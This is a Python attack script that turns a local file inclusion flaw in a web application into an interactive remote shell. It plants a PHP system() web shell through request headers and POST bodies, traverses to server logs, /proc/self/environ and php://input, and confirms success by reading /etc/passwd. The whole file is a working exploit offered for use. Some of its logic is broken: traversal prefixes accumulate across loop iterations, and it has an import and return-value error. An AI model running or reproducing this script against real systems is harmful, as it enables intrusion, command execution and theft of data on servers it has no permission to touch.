import sys
import requests
import urllib

payload_paths = [
 "/var/log/apache2/access.log",
 "/var/log/nginx/access.log",
 "/proc/self/environ",
 "php://input",
]

if len(sys.argv) < 2:
 print("{} http://example.com/?file=FUZZ".format(sys.argv[0]))
 sys.exit(0)

payload_sys = "<?php system($_GET['cmd']); __halt_compiler(); ?>"

headers = {
 "User-Agent":payload_sys,
 "Referer":payload_sys
}
 
data = payload_sys

payload_found = ""
url_fuck = ""

url = sys.argv[1]

def findshell():
 print("Finding shell...")
 for payload_path in payload_paths:
  for am in ["","%00"]:
   for inum in range(5):
    payload_path = ("../" * inum) + payload_path + am
    url_test = url.replace("FUZZ", payload_path)
    url_fuck = url_test
    url_test = url_test + "&cmd=cat+/etc/passwd"
    print("Trying {}".format(url_test))
    r = requests.post(url=url_test, data=data, headers=headers)
    if "root:" in r.text:
     payload_found = payload_path
     print("Found a shell!")
     return url_fuck, payload_found 

url_fuck, payload_found = findshell()
if url_fuck == "" or payload_found == "": sys.exit(-1)

while 1:
 cmd = input("$ ")
 url_pay = url_fuck + "&cmd=" + urllib.parse.quote_plus(cmd)
 r = requests.post(url=url_pay, data=data, headers=headers)
 print(r.text)
